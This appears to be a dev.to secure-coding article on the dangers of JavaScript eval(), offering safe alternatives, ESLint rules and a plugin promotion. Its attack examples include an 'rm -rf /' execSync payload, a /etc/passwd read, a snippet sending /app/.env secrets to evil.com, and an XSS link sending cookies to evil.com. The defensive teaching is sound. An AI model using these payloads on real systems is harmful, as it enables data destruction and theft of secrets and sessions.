---
title: 'eval() is Evil: Dynamic Code Execution Attacks'
published: false
description: 'eval() executes any code, including attacker code. Here is why it is dangerous and what alternatives exist.'
tags: javascript, security, xss, eslint
cover_image:
series: Secure Coding
---

```javascript
const userData = req.body.formula;
const result = eval(userData);
```

You just gave attackers a **shell on your server**.

## The Attack

```javascript
// User submits "2 + 2"
eval('2 + 2'); // 4 ✓

// Attacker submits:
eval(`require('child_process').execSync('rm -rf /')`);
// 💀 Server destroyed
```

## Attack Vectors

### 1. Remote Code Execution

```javascript
// Server-side eval
eval(userInput);

// Attacker: require('fs').readFileSync('/etc/passwd')
```

### 2. Data Exfiltration

```javascript
// Attacker:
eval(`
  const data = require('fs').readFileSync('/app/.env');
  require('http').get('http://evil.com/?' + data);
`);
// Secrets stolen
```

### 3. XSS via eval

```javascript
// Browser eval
eval(urlParams.get('code'));

// Attacker link: ?code=document.location='http://evil.com/'+document.cookie
```

## The eval() Family

All of these are dangerous:

```javascript
// ❌ Direct eval
eval(userInput);

// ❌ Function constructor
new Function(userInput)();

// ❌ setTimeout/setInterval with string
setTimeout(userInput, 1000);
setInterval(userInput, 1000);

// ❌ Implicit eval
script.innerHTML = userInput;
```

## Safe Alternatives

### For Math Expressions

```javascript
// ❌ Dangerous
const result = eval(userFormula);

// ✅ Safe: Use a parser
import { evaluate } from 'mathjs';
const result = evaluate(userFormula);

// ✅ Safe: Restricted evaluation
import { Parser } from 'expr-eval';
const parser = new Parser();
const result = parser.evaluate(userFormula);
```

### For JSON Parsing

```javascript
// ❌ Dangerous
const data = eval('(' + jsonString + ')');

// ✅ Safe
const data = JSON.parse(jsonString);
```

### For Dynamic Property Access

```javascript
// ❌ Dangerous
const value = eval(`obj.${userPath}`);

// ✅ Safe
const value = userPath.split('.').reduce((o, k) => o?.[k], obj);

// ✅ Safer: Use lodash/get
import { get } from 'lodash';
const value = get(obj, userPath);
```

### For Templates

```javascript
// ❌ Dangerous
const html = eval('`' + templateString + '`');

// ✅ Safe: Use a template engine
import Handlebars from 'handlebars';
const template = Handlebars.compile(templateString);
const html = template(data);
```

## When eval() Seems Necessary

### Dynamic Code Loading

```javascript
// ❌ Dangerous
eval(await fetch('/plugins/custom.js'));

// ✅ Safe: Use import()
const module = await import('/plugins/custom.js');
```

### Configuration DSL

```javascript
// ❌ Dangerous: User-defined rules
rules.forEach((rule) => eval(rule.condition));

// ✅ Safe: Use a DSL parser
import { createRuleEngine } from 'json-rules-engine';
const engine = createRuleEngine(rules);
```

## ESLint Rules

```javascript
// eslint.config.js
import secureCoding from 'eslint-plugin-secure-coding';
import browserSecurity from 'eslint-plugin-browser-security';

export default [
  {
    rules: {
      'secure-coding/detect-eval-with-expression': 'error',
      'browser-security/no-eval': 'error',
    },
  },
];
```

### Error Output

```bash
src/calculator.ts
  25:10 error  🔒 CWE-95 OWASP:A03 CVSS:9.8 | Dynamic code execution via eval
               Risk: Remote code execution if input is user-controlled
               Fix: Use mathjs.evaluate() for math, JSON.parse() for JSON,
                    or a sandboxed parser for DSLs
```

## Quick Install


```javascript
import secureCoding from 'eslint-plugin-secure-coding';
export default [secureCoding.configs.recommended];
```

---

📦 [npm: eslint-plugin-secure-coding](https://www.npmjs.com/package/eslint-plugin-secure-coding)
📖 [Rule: detect-eval-with-expression](https://github.com/ofri-peretz/eslint/tree/main/packages/eslint-plugin-secure-coding/docs/rules/detect-eval-with-expression.md)

{% cta https://github.com/ofri-peretz/eslint %}
⭐ Star on GitHub
{% endcta %}

---

🚀 **grep -r "eval(" in your codebase. What did you find?**

[GitHub](https://github.com/interlace-collie) | [X](https://x.com/ofriperetzdev) | [LinkedIn](https://linkedin.com/in/ofri-peretz) | [Dev.to](https://dev.to/ofriperetz)
